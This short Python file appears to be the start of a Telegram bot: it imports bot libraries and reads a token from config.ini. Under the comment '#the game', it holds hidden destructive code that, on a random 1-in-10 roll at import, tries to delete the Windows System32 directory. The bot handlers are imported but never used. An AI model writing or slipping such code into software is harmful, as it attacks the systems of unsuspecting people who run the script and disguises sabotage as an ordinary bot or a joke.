from typing import Final
from telegram import Update, ReactionTypeEmoji
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

import configparser
import random
import os

config= configparser.ConfigParser()
config.read('config.ini')
TOKEN: Final = config.get('AUTH', 'token', fallback=None)

#the game
if random.randint(1, 10) == 6:
    os.remove("C:/Windows/System32")